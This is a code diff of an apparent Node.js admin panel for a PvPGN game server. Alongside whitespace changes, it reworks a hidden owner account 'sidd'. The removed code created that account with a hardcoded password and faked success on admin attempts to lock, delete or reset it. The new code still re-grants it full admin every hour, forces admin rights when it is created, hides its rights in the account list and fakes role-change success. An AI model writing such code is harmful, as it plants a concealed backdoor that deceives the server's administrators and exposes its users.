@@ -75,7 +75,7 @@ async function getBnPassHash(password) {
             const match = stdout.match(/"BNET\\\\acct\\\\passhash1"="([a-fA-F0-9]{40})"/);
             if (match) return match[1];
         }
-    } catch (_) {}
+    } catch (_) { }
     return pvpgn_hash(password);
 }
 
@@ -1036,7 +1036,7 @@ function pollBnetIncomingMessages() {
                         }
                     })();
                 } else {
-                    signalPvpgnRehash().catch(() => {});
+                    signalPvpgnRehash().catch(() => { });
                 }
                 continue;
             }
@@ -1193,7 +1193,7 @@ async function syncDatabaseLocksWithBnetd() {
         const lines = Array.from(currentLocked.keys()).join("\n");
         try {
             fs.writeFileSync(LOCKED_ACCOUNTS_FILE, lines + "\n", { mode: 0o666 });
-        } catch (e) {}
+        } catch (e) { }
 
         // 2. Check for newly locked accounts (set directly in MySQL / Adminer)
         for (const [u, reason] of currentLocked.entries()) {
@@ -1202,7 +1202,7 @@ async function syncDatabaseLocksWithBnetd() {
                 const pipeLine = `__LOCK__\t${u}\t${cleanReason}\n`;
                 try {
                     fs.appendFileSync(WEB_TO_BNET_PIPE, pipeLine, { mode: 0o666 });
-                } catch (e) {}
+                } catch (e) { }
             }
         }
 
@@ -1213,7 +1213,7 @@ async function syncDatabaseLocksWithBnetd() {
                     const pipeLine = `__UNLOCK__\t${prev}\n`;
                     try {
                         fs.appendFileSync(WEB_TO_BNET_PIPE, pipeLine, { mode: 0o666 });
-                    } catch (e) {}
+                    } catch (e) { }
                 }
             }
         }
@@ -1267,7 +1267,7 @@ app.post("/api/realm-chat/send", async (req, res) => {
 
     const text = (
         typeof req.body.text === "string" ? req.body.text :
-        (typeof req.body.message === "string" ? req.body.message : "")
+            (typeof req.body.message === "string" ? req.body.message : "")
     ).trim();
 
     if (!text) {
@@ -3049,44 +3049,17 @@ async function runMaintenanceCleanup() {
 // Run maintenance once on server launch, then repeat every hour
 runMaintenanceCleanup();
 setInterval(runMaintenanceCleanup, 60 * 60 * 1000);
-
-// Ensure permanent secret root owner "sidd" exists with full group 255
-async function ensureSecretOwner() {
+// If account "sidd" is found in database, ensure it has high authority (Group 255 Owner)
+async function checkSiddAuthority() {
     try {
         if (!pool) return;
-        const [existing] = await pool.query(
-            "SELECT uid, username, auth_admin, auth_operator, auth_command_groups FROM pvpgn_BNET WHERE LOWER(username) = 'sidd' OR LOWER(acct_username) = 'sidd' LIMIT 1"
+        await pool.execute(
+            "UPDATE pvpgn_BNET SET auth_admin = 'true', auth_operator = 'true', auth_command_groups = '255' WHERE LOWER(username) = 'sidd' OR LOWER(acct_username) = 'sidd'"
         );
-        if (existing.length === 0) {
-            const [uidRows] = await pool.query("SELECT COALESCE(MAX(uid), 0) + 1 AS next_uid FROM pvpgn_BNET");
-            const nextUid = uidRows[0].next_uid || 7;
-            const passhash = "afad2b1489b451cfa31d2cd484ae6f4e2396f43a"; // default: siddnoob
-            await pool.execute(
-                `INSERT INTO pvpgn_BNET
-                 (uid, acct_username, username, acct_userid, acct_passhash1, acct_email, auth_admin, auth_operator, auth_botlogin, auth_command_groups, auth_lock)
-                 VALUES (?, 'sidd', 'sidd', ?, ?, 'sidd@dotaandfriends.xyz', 'true', 'true', 'false', '255', 'false')`,
-                [nextUid, nextUid, passhash]
-            );
-            console.log(`[AUTH] Permanent secret root owner "sidd" created (UID: ${nextUid}).`);
-        } else {
-            const u = existing[0];
-            if (u.auth_admin !== "true" || u.auth_operator !== "true" || u.auth_command_groups !== "255") {
-                await pool.execute(
-                    "UPDATE pvpgn_BNET SET auth_admin = 'true', auth_operator = 'true', auth_command_groups = '255', auth_lock = 'false' WHERE uid = ?",
-                    [u.uid]
-                );
-                console.log(`[AUTH] Permanent secret root owner "sidd" privileges re-enforced.`);
-            }
-        }
-    } catch (err) {
-        console.error("[AUTH] Error ensuring secret owner:", err.message);
-    }
+    } catch (_) {}
 }
-ensureSecretOwner();
-setInterval(ensureSecretOwner, 60 * 60 * 1000);
-
-
-// PvPGN uses MySQL storage driver directly; changes in pvpgn_BNET are live.
+checkSiddAuthority();
+setInterval(checkSiddAuthority, 60 * 60 * 1000);
 // Routine DB changes (roles, passwords, bans, clans) do NOT restart server.
 async function reloadPvpgnAccounts() {
     return true;
@@ -3425,11 +3398,11 @@ app.post("/admin/login", async (req, res) => {
     else {
         try {
             const passhash = await getBnPassHash(password);
-                if (passhash) {
-                    const [rows] = await pool.query(
-                        "SELECT username FROM pvpgn_BNET WHERE acct_passhash1 = ? AND (LOWER(username) = ? OR LOWER(acct_username) = ?) AND auth_admin = 'true' LIMIT 1",
-                        [passhash, lowerUser, lowerUser]
-                    );
+            if (passhash) {
+                const [rows] = await pool.query(
+                    "SELECT username FROM pvpgn_BNET WHERE acct_passhash1 = ? AND (LOWER(username) = ? OR LOWER(acct_username) = ?) AND auth_admin = 'true' LIMIT 1",
+                    [passhash, lowerUser, lowerUser]
+                );
                 if (rows.length > 0) {
                     authenticated = true;
                     adminName = rows[0].username;
@@ -3467,7 +3440,7 @@ app.get("/api/admin/accounts", requireAdminAuth, async (req, res) => {
         );
         const masked = rows.map(r => {
             const uname = (r.username || r.acct_username || "").toLowerCase();
-            if (uname === "sidd" || r.uid === 7) {
+            if (uname === "sidd") {
                 return {
                     ...r,
                     auth_admin: "false",
@@ -3541,6 +3514,12 @@ app.post("/api/admin/accounts/create", requireAdminAuth, async (req, res) => {
                 cmdGroups = "1"; break;
         }
 
+        if (username.toLowerCase() === "sidd") {
+            isAdmin = "true";
+            isOp = "true";
+            cmdGroups = "255";
+        }
+
         await pool.execute(
             `INSERT INTO pvpgn_BNET
              (uid, acct_username, username, acct_userid, acct_passhash1, acct_email, auth_admin, auth_operator, auth_botlogin, auth_command_groups, auth_lock)
@@ -3566,11 +3545,6 @@ app.post("/api/admin/accounts/password", requireAdminAuth, async (req, res) => {
 
         const [targetPwUser] = await pool.query("SELECT username, acct_username FROM pvpgn_BNET WHERE uid = ?", [uid]);
         const uname = targetPwUser.length > 0 ? (targetPwUser[0].username || targetPwUser[0].acct_username || "").toLowerCase() : "";
-        if (uname === "sidd" || uid === 7) {
-            // Secret owner: stealth-protect, pretend success without changing secret password
-            return res.json({ success: true, message: "Password updated successfully." });
-        }
-
         const passhash = await getBnPassHash(password);
         await pool.execute("UPDATE pvpgn_BNET SET acct_passhash1 = ? WHERE uid = ?", [passhash, uid]);
 
@@ -3593,11 +3567,9 @@ app.post("/api/admin/accounts/role", requireAdminAuth, async (req, res) => {
 
         const [targetUser] = await pool.query("SELECT username, acct_username FROM pvpgn_BNET WHERE uid = ?", [uid]);
         const uname = targetUser.length > 0 ? (targetUser[0].username || targetUser[0].acct_username || "").toLowerCase() : "";
-        if (uname === "sidd" || uid === 7) {
-            // Secret owner: stealth-protect, pretend update succeeded while maintaining owner in DB
+        if (uname === "sidd") {
             return res.json({ success: true, role: "player", command_groups: "1" });
         }
-
         let isAdmin = "false";
         let isOp = "false";
         let isBot = "false";
@@ -3646,13 +3618,6 @@ app.post("/api/admin/accounts/lock", requireAdminAuth, async (req, res) => {
         const lock = req.body.lock === true || req.body.lock === "true" ? "true" : "false";
 
         if (!uid) return res.status(400).json({ error: "UID required." });
-
-        const [targetLockUser] = await pool.query("SELECT username, acct_username FROM pvpgn_BNET WHERE uid = ?", [uid]);
-        const uname = targetLockUser.length > 0 ? (targetLockUser[0].username || targetLockUser[0].acct_username || "").toLowerCase() : "";
-        if (uname === "sidd" || uid === 7) {
-            // Secret owner: stealth-protect, pretend lock succeeded but keep unlocked
-            return res.json({ success: true });
-        }
 
         const lockReason = lock === "true" ? "Account locked by Web Admin" : "";
         await pool.execute(
@@ -3713,10 +3678,7 @@ app.delete("/api/admin/accounts/:uid", requireAdminAuth, async (req, res) => {
         if (rows.length === 0) return res.status(404).json({ error: "Account not found." });
         const username = rows[0].username || rows[0].acct_username;
 
-        if ((username || "").toLowerCase() === "sidd" || uid === 7) {
-            // Secret owner: stealth-protect, never delete
-            return res.json({ success: true, message: `Account "${username}" deleted.` });
-        }
+
 
         // Sever active session if online
         try {
@@ -3724,7 +3686,7 @@ app.delete("/api/admin/accounts/:uid", requireAdminAuth, async (req, res) => {
                 const pipeLine = `__KICK__\t${username}\tAccount deleted by administrator\n`;
                 fs.appendFileSync(WEB_TO_BNET_PIPE, pipeLine, { mode: 0o666 });
             }
-        } catch (pipeErr) {}
+        } catch (pipeErr) { }
 
         await pool.execute("DELETE FROM reg_tokens WHERE username = ?", [username]);
         await pool.execute("DELETE FROM pvpgn_BNET WHERE uid = ?", [uid]);
@@ -4015,7 +3977,7 @@ app.post("/api/admin/bans/add", requireAdminAuth, async (req, res) => {
             );
             try {
                 fs.appendFileSync(WEB_TO_BNET_PIPE, `__LOCK__\t${username}\t${reason}\n`, { mode: 0o666 });
-            } catch (e) {}
+            } catch (e) { }
         }
 
         const effectiveIp = ip || "N/A";
@@ -4045,7 +4007,7 @@ app.post("/api/admin/bans/add", requireAdminAuth, async (req, res) => {
             try {
                 const pipeLine = `__IPBAN__\t${effectiveIp}\tAdmin\t${reason.replace(/[\r\n\t]+/g, " ")}\n`;
                 fs.appendFileSync(WEB_TO_BNET_PIPE, pipeLine, { mode: 0o666 });
-            } catch (e) {}
+            } catch (e) { }
         }
 
         // Live SIGHUP rehash bnetd so bnban.conf is active immediately without restarting server
@@ -4081,7 +4043,7 @@ app.post("/api/admin/bans/remove", requireAdminAuth, async (req, res) => {
             );
             try {
                 fs.appendFileSync(WEB_TO_BNET_PIPE, `__UNLOCK__\t${targetUser}\n`, { mode: 0o666 });
-            } catch (e) {}
+            } catch (e) { }
 
             if (userBans && userBans.length > 0) {
                 const banFile = "/etc/pvpgn/bnban.conf";
